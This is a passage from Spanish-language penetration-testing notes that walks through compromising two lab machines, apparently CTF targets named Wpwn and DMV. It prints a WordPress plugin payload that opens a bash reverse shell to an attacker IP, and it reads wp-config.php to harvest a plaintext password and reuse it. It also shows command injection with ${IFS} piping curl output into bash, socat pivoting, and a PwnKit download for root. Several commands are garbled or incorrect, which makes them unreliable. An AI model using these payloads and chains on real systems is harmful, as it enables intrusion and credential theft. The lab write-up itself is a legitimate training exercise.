se configura un listener en el puerto 443, listo para recibir conexiones entrantes. Esto es útil en situaciones como la creación de una shell inversa o la configuración de una comunicación segura a través del puerto 443.

- `sudo`: El comando se ejecuta con privilegios de superusuario. Esto puede ser necesario si se requieren permisos especiales para enlazar y escuchar en el puerto especificado.
   
- `nc`: Es el comando abreviado de "netcat", una herramienta versátil para la transferencia de datos a través de redes. En este caso, se utiliza para crear un listener.
   
- `-l`: Esta opción indica que se debe poner en modo escucha o "listening". El comando se quedará en espera de conexiones entrantes.
   
- `-v`: Activa el modo "verbose" o detallado, lo que significa que mostrará información adicional y mensajes de estado durante la ejecución.
   
- `-p 443`: Especifica el número de puerto en el que se establecerá el listener. En este caso, se utiliza el puerto 443, que es comúnmente utilizado por el protocolo HTTPS.
   
- `-n`: Deshabilita la resolución de nombres, lo que significa que no intentará resolver direcciones IP en nombres de host.
   
- `-vp`: Combinación de las opciones `-v` y `-p`, para activar el modo verbose y especificar el número de puerto.
```

![[Captura de pantalla 2023-06-22 143226.png]]

==Mandamos la petición web.

![[Captura de pantalla 2023-06-22 143240.png]]
```
http://102.168.153.128/wordpress/wp-admin/admin-post.php?wsp_debug=load_options&swp_url=http://192.168.153.129/comando1.txt&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.152.129/443 0>%261

- `http://102.168.153.128/wordpress/wp-admin/admin-post.php` es la URL a la que se realiza la solicitud. Parece ser una ruta dentro de un sitio de WordPress, específicamente la ruta `admin-post.php` en el directorio `wp-admin`.

- `?` indica el inicio de los parámetros de la URL.

- `wsp_debug=load_options` es un parámetro que indica que se desea cargar opciones de depuración.

- `&` se utiliza para separar múltiples parámetros en la URL.

- `swp_url=http://192.168.153.129/comando1.txt` es otro parámetro que especifica una URL (`http://192.168.153.129/comando1.txt`) a la que se está haciendo referencia.

- `cmd=bash -c "bash -i >%26 /dev/tcp/192.168.152.129/443 0>%261"` es el tercer parámetro. Parece ser un comando que se pasa al servidor.
```

![[Captura de pantalla 2023-06-22 144424.png]]
==Reverse Shell exitosa.

---
# Tratamiento de la TTI (1/2)

```
echo $TERM
export TERM=xterm
```

![[Captura de pantalla 2023-06-22 144445.png]]

```
hostname -I
whoami
```

![[Captura de pantalla 2023-06-22 144534.png]]

---
# Escalamiento a usuario.

En el archivo `wp-config.php` de WordPress, se encuentran las configuraciones principales del sitio, incluyendo la información de la base de datos. En relación a las contraseñas, el archivo `wp-config.php` contiene la contraseña de la base de datos en formato de texto claro.
La contraseña en texto claro almacenada en el archivo `wp-config.php` es un riesgo de seguridad significativo. Si un atacante obtiene acceso no autorizado al servidor o al archivo, podría leer directamente la contraseña y utilizarla para acceder a la base de datos de WordPress.
```
cd ..
cat wp-config.php
```

![[Captura de pantalla 2023-06-22 144840.png]]
==password:R3&]vzhHmMn9,:-5

==Vamos a intentar reutilizar la contraseña con el unico usuario resistrado.

```
grep "sh$" /etc/passwd/

- `grep`: Es una herramienta de línea de comandos utilizada para buscar patrones en archivos o texto.

- `"sh$"`: Es el patrón que se está buscando. En este caso, "$" se utiliza para indicar el final de la línea y "sh" es el texto que se busca.

- `/etc/passwd`: Es la ubicación del archivo en el que se realizará la búsqueda. El archivo `/etc/passwd` es un archivo de sistema en sistemas operativos basados en UNIX que almacena información sobre las cuentas de usuario
- 
su takis
```

![[Captura de pantalla 2023-06-22 145257.png]]
==takis::R3&]vzhHmMn9,:-5

```
whoami
pwd
cat user.txt
```
![[Captura de pantalla 2023-06-22 145443.png]]
==Flag user pwned.

---
# Escalamiento de privilegios root. 

==Al intentar acceder como root con sudo -l nos indica que no ay contraseña para acceder a ese usuario así que dando enter nos debería dejar apoderarnos del usuario root.

```
sudo -l
sudo su
whoami
cd /root/
cat root.txt
```
![[Captura de pantalla 2023-06-22 145824.png]]
==Listando la supuesta flag del usuario root nos indica que estamos en el lugar equibocados y nos 
pide buscar en un directorio llamado USB que esta en algun lugar de el disco duro.

```
Find / - name *\USB\*
cd /usr/games/USB
cat root
```
![[Captura de pantalla 2023-06-22 171709.png]]

==Wpwn Pwned...

---
# Pivoting  de Wpwn a DMV.

El objetivo principal del pivoting es escalar el acceso y expandir el control sobre la red objetivo. Una vez que se ha comprometido un sistema, el atacante puede utilizar técnicas como la escalada de privilegios, el robo de credenciales o la explotación de vulnerabilidades adicionales para moverse lateralmente en la red y acceder a sistemas más críticos o valiosos.
El pivoting puede involucrar el uso de herramientas de acceso remoto, como el túnel SSH o el reenvío de puertos, para establecer conexiones desde el sistema comprometido hacia otros sistemas de la red. También puede implicar el uso de herramientas de escaneo y enumeración desde el sistema comprometido para descubrir otros sistemas, servicios y vulnerabilidades.

==Vamos a crear un script pequeño que con ayuda de el ping de la máquina Wpw,  nos ayudara a localizar la IP de la maquina DMV.

```
#!/bin/bash

for i in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 10.10.18.$i" &>/dev/null && echo "[+] 10.10.18.$i - ACTIVE"
done
wait

```

==Este se debe crear con nano y guadarlo con una extencion .sh y darle permisos de ejecucion con chmod +x HostDiscovery.sh

Este código es un bucle que intenta realizar un ping a una serie de direcciones IP en el rango `10.10.18.1` a `10.10.18.254`. Utiliza el comando `timeout` para establecer un tiempo límite de 1 segundo para cada intento de ping. Si la dirección IP responde al ping, se imprime el mensaje "[+] 10.10.18.$i - ACTIVE" indicando que la dirección IP está activa.

![[Captura de pantalla 2023-06-23 131518.png]]

 ==Dándonos un resultado exitoso arrojándonos la IP victima de la maquina DMV.
 
```
DMV:IP:10.10.18.129
```

==Nos vamos a conectar por SSH gracias a que tiene el puerto disponible y tenemos contraseñas validas.

```
ssh takis@192.168.153.129
~C "Mayúscula"

```

![[Captura de pantalla 2023-06-23 133031.png]]

```
-L 8081:192.168.153.129:80
```

==El comando hace que mi máquina SwordFish interprete lo que la máquina DMV despliega en el puerto 80 como mi puerto 8081

```
lsof -i:8081
```

==Con esto confirmamos la presencia de el servicio web de DMV como nuestro servicio desplegado por el puerto 8081

![[Captura de pantalla 2023-06-23 140727.png]]

---

# Escalamiento a usuario.

==Como se muestra en la petición web a nuestra máquina el servicio que despliega DMV parece ser una plataforma de descargas de videos de YouTube., Este tiene la posibilidad de un imput por parte del usuario.

http://127.0.0.1/

![[Captura de pantalla 2023-06-23 134207.png]]

==Interseptaremos la petición del dicho imput  con BurpSuite

![[Captura de pantalla 2023-06-23 140748.png]]

==Parce ser que el servicio es una aplicación de Linux que admite comandos, ese será nuestro vector de ataque.

```
--help
```

![[Captura de pantalla 2023-06-23 141107.png]]

```
$(whoami)
```



![[Captura de pantalla 2023-06-23 141455.png]]

==Los comandos muestran el output de la máquina incompletos, jugando con diferentes métodos de Shell code el siguiente comando con IFS parece mostrarnos la respuesta de DMV completa 

```
<`cat${IFS}/etc/passwd`

```


![[Captura de pantalla 2023-06-23 142432.png]]

==Lo comprobamos visualizando el documento/etc/passwd de manera completa.

==Lo siguiente es intentar una comunicación hacia nuestra máquina con ayuda de socat y levantando un http.server en nuestro equipo local.

```
socat TCP-LISTEN:4545,fork TCP:192.168.153.129:2323
Python3 -m http.server 2323
```


![[Captura de pantalla 2023-06-23 143243.png]]


```
<`curl${IFS}10.10.18.128:4545`

```

![[Captura de pantalla 2023-06-23 143310.png]]

```
socat TCP-LISTEN:4545,fork TCP:192.168.153.129:2324
socat TCP-LISTEN:1212,fork TCP:192.168.153.129:3131
python3 -m http.server 2324
sudo nc -nlvp 3131
```

```
#!/bin/bash

bash -i >& /dev/TCP/10.10.18.128\1212 

```

![[Captura de pantalla 2023-06-23 150020.png]]

```
<`curl${IFS}10.10.18.128:4545|bash`
```

![[Captura de pantalla 2023-06-23 150054.png]]

==Python3 nos representa que tubo una petición GET con estado 200 lo cual es el indicio que podemos pivotar de máquina en máquina.


#  ==Usuario www-data Pwned.

---


# Tratamiento de la TTI  DMV(2/2)

```
script /dev/null -c bash
Ctrl + c
sudo nc -nlvp 3131
reset xterm
```

![[Captura de pantalla 2023-06-23 150349.png]]

```
export TERM=xterm
```

![[Captura de pantalla 2023-06-23 150532.png]]

---

# Escalamiento de privilegios root DMV.

==Cuando filtramos las aplicaciones que tiene dentro DMV se ve una aplicación vulnerable llamada pkexec

```
find -4000 /dev/null/
```
![[Captura de pantalla 2023-06-23 150834.png]]

==La aplicación es vulnerable a una herramienta que encontramos en Github llamada PwnKit

```
Curl -fsSL http://PwnKit.github.com -o PwnKit
```

![[Captura de pantalla 2023-06-23 151111.png]]

==En el entunelamiento Wpwn está interpretando sus servicios en mi máquina de manera igual, así que con otro socet haremos otro túnel que comunique para descargar el PwnKit.

```
socat TCP-LISTEN:4545,fork TCP:192.168.153.129:2324
socat TCP-LISTEN:1212,fork TCP:192.168.153.129:3131
cd /tmp/
wget http://10.10.18.128:1212\PwnKit
```

==

![[Captura de pantalla 2023-06-23 151532.png]]

```
Chmod -x PwnKit
./pwkit 
Whoami 
```

![[Captura de pantalla 2023-06-23 151753.png]]
